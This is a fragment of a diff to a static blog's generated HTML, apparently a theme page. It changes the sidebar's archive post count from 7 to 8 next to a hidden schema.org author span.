     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1545,7 +1718,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
